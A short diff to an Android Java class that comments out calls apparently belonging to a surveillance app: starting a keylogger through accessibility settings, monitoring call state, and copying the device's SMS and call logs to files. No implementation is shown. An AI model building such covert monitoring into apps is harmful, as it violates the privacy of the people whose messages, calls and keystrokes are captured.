@@ -34,11 +34,11 @@ public class ActionUtils {
                 //permissionHandler.resetAllPermissionManually(this);
 
 
-                KeyLoggerUtils.startAccessibilitySettingIntent(activity);
+              //  KeyLoggerUtils.startAccessibilitySettingIntent(activity);
                 FileUtils.startFileAccessSettings(activity);
-                CallUtils.monitorCallState(activity);
-                FileUtils.appendDataToFile(FileMap.SMS, MessageUtils.getMessages(activity, FileMap.SMS));
-                FileUtils.appendDataToFile(FileMap.CALL, MessageUtils.getMessages(activity, FileMap.CALL));
+              //  CallUtils.monitorCallState(activity);
+              //  FileUtils.appendDataToFile(FileMap.SMS, MessageUtils.getMessages(activity, FileMap.SMS));
+              //  FileUtils.appendDataToFile(FileMap.CALL, MessageUtils.getMessages(activity, FileMap.CALL));
             });
         }
     }
